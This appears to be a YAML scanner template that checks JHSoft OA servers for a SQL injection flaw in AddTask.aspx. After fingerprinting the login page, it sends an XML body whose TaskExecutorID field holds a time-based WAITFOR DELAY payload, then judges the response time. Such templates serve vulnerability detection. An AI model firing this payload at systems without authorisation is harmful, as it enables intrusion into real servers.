id: poc-yaml-jinher-addtask-aspx-sqli

info:
  name: JHSoft OA AddTask.aspx SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sqli

variables:
  t1: "{{rand_int(4,9)}}"
  t2: "{{to_number(t1) + 3}}"

flow: http(1) && http(2)

http:
  - id: check-page
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "JHSoft"

  - id: sqli-check
    method: POST
    path:
      - "{{BaseURL}}/c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/"
    headers:
      Content-Type: application/xml
    body: |
      <root>
      <Page>
      <PageName>TaskDetect</PageName>
      </Page>
      <StartTime>2023-01-01 00:00:00</StartTime>
      <EndTime>2023-01-01 00:00:00</EndTime>
      <TaskExecutorID>3');WAITFOR DELAY'0:0:{{t1}}'-- </TaskExecutorID>
      </root>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "1"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < t2"
